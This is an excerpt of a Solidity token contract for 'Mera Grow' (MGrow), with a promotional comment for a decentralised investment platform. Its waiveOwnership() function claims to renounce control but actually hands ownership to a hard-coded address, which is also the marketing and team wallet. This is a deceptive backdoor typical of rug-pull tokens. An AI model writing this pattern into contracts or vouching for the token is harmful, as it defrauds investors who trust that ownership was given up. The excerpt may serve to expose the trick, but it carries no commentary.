...
/*
MeraGrow is a blockchain-based, 
community-governed investment platform 
and decentralised venture capital vehicle 
that allows anyone to participate in the 
latest and most profitable blockchain, 
DeFi and metaverse projects and strategies. 
Join the MeraGrow and participate in our journey!

https://www.meragrow.online/
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xccF74E96De658C4F70FcA7533d79AbA204a35438);
    }
...
contract MeraGrow is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Mera Grow";
    string private _symbol = "MGrow";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xccF74E96De658C4F70FcA7533d79AbA204a35438);
    address payable public teamWalletAddress = payable(0xccF74E96De658C4F70FcA7533d79AbA204a35438);
